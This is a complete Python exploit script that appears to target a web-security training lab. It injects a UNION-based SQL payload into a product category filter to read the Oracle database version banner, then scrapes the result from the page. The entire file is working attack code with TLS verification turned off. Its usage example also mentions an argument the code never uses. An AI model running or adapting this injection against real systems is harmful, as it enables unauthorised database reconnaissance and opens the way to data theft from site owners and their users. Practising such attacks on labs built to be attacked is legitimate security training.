import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit_sqli_version(url):
	path = '/filter?category=Gifts'
	payload = "' UNION SELECT banner, NULL FROM v$version--"
	r = requests.get(url + path + payload, verify=False)
	response = r.text
	if 'Oracle Database' in response:
		print('Database Found, printing out the version ...')
		soup = BeautifulSoup(response, 'html.parser')
		version = soup.find(text=re.compile('.*Database.*'))
		print(f'Database version displayed is {version}')
		return True
	return False

if __name__ == '__main__':
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f"[-] Usage: {sys.argv[0]} <url>")
		print(f"[-] Example: {sys.argv[0]} www.example.com '1=1'")
		sys.exit(-1)

	if not exploit_sqli_version(url):
		print("did not find db version")